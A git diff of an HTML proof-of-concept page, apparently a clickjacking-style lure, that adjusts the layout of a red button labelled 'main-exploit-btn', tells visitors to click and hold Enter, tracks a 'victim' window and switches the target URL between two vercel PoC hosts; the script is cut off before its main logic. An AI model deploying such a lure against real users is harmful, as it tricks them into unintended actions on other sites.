@@ -1,24 +1,25 @@
 <!DOCTYPE html>
 <html>
 
-<body style="background: #fff5f5; font-family: sans-serif; text-align: center; padding: 50px;">
+<body style="background: #fff5f5; font-family: sans-serif; text-align: left; padding: 20px;">
 
     <button id="main-exploit-btn"
-        style="margin-top: 30px; padding: 5px 5px; font-size: 24px; cursor: pointer; background: #ff4444; color: white; border: none; border-radius: 12px; font-weight: bold; transition: all 0.3s ease;">
+        style="margin-left: 250px; margin-top: 20px; padding: 10px; font-size: 24px; cursor: pointer; background: #ff4444; color: white; border: none; border-radius: 12px; font-weight: bold; transition: all 0.3s ease;">
         click and hold 2s
     </button>
 
     <div id="instruction-box"
-        style="margin-top: 30px; border: 2px dashed #ff4444; padding: 20px; background: white; max-width: 500px; margin-left: auto; margin-right: auto;">
+        style="margin-top: 20px; border: 2px dashed #ff4444; padding: 20px; background: white; max-width: 500px;">
         <p id="step-text"><b>Step 1:</b> Click and <b>HOLD "Enter"</b> on the red button above.</p>
     </div>
 
     <script>
-        const targetURL = "https://cape-poc.vercel.app/";
+        const targetURL = "https://read-poc.vercel.app/";
         const mainBtn = document.getElementById('main-exploit-btn');
         const stepText = document.getElementById('step-text');
         let opened = false;
         let victim = null;
+
         document.addEventListener("keydown", (event) => {
             if (event.key !== "Enter") return;
             if (event.repeat || opened) return;
